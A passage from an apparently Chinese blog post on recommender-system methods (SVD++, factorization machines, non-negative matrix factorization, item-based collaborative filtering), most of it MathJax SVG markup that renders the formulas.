-64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mn" transform="translate(389, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g><g data-mml-node="mtr" transform="translate(0, -1003.3)"><g data-mml-node="mtd" transform="translate(4125.2, 0)"><g data-mml-node="mo"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(778, 0)"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g><g data-mml-node="mo" transform="translate(1361, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="munder" transform="translate(1750, 0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="mi" transform="translate(519.8, -1050) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3194, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3583, 0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="msubsup" transform="translate(4012, 0)"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(345, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(345, -247) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4811.5, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(5867.2, 0)"><path data-c="2225" d="M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6645, 0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="msup" transform="translate(7949.3, 0)"><g data-mml-node="mo"><path data-c="2225" d="M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z"></path></g><g data-mml-node="mn" transform="translate(500, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(8852.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9464, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="munder" transform="translate(10464.3, 0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="mi" transform="translate(600, -1084.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(11908.3, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(12297.3, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mn" transform="translate(429, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(429, -247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(13129.8, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(14185.6, 0)"><path data-c="2225" d="M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(14963.4, 0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="msup" transform="translate(16020.1, 0)"><g data-mml-node="mo"><path data-c="2225" d="M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z"></path></g><g data-mml-node="mn" transform="translate(500, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(17201.4, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(18257.2, 0)"><path data-c="2225" d="M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(19035, 0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(490, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="msup" transform="translate(20144.1, 0)"><g data-mml-node="mo"><path data-c="2225" d="M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z"></path></g><g data-mml-node="mn" transform="translate(500, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(21047.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(21436.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(21825.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1778 -2695.4 1 4890.9"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-11"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(389, 0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(889, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(1389, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>对此式的分解算法优化成为SVD++算法，较为复杂，此处不详细推导。此外，还有将时间流逝用户兴趣变化纳入考虑的多种推荐评分的改进版，奇异值分解计算与普通的评分矩阵类似。</p>
<p>实际计算稀疏矩阵奇异值分解的时候，会采用因子机(Factorization Machine, FM)模型或者FFM模型或者交替最小二乘法(Alternating Least Squares)算法加速奇异值的计算。其中，因子机算法在实际商业公司的推荐算法中使用最广。 <img src="https://tracholar.github.io/assets/images/ffm.png" alt="ffm.png"></p>
<h2 id="非负矩阵分解">非负矩阵分解</h2>
<p>非负矩阵分解的一些算法的时间复杂度效果好于SVD的分解算法。</p>
<p>然而各种看起来没多少优化好的库函数，更不要提什么多线程或者分布式版本，，真用起来自己写一个或者现成的库大概率跑不过原有的模型，所以没太多人用</p>
<h2 id="计算相似度">计算相似度</h2>
<h3 id="协同过滤算法">协同过滤算法</h3>
<p>最老最经典的一个算法了，通过计算相似度给用户推荐兴趣和关注点相似用户的感兴趣内容。</p>
<h4 id="基于物品的协同过滤">基于物品的协同过滤</h4>
<p>（item-based collaborative filtering，ItemCF） 找到物品之间的属性关联，向用户推荐属性相似的物品 设N(i)是喜欢i物品的用户数 相似度：</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 31.645ex"><svg style="vertical-align: -2.172ex; min-width: 31.645ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="5.475ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -1460)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2578, 0) translate(-2578, 0)"><g transform="translate(0 1460) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="4415.6 -1460 1 2420"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="TeXAtom" transform="translate(716, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1579.1, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(2634.8, 0)"><g data-mml-node="mrow" transform="translate(220, 710)"><g data-mml-node="mo"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(1166, 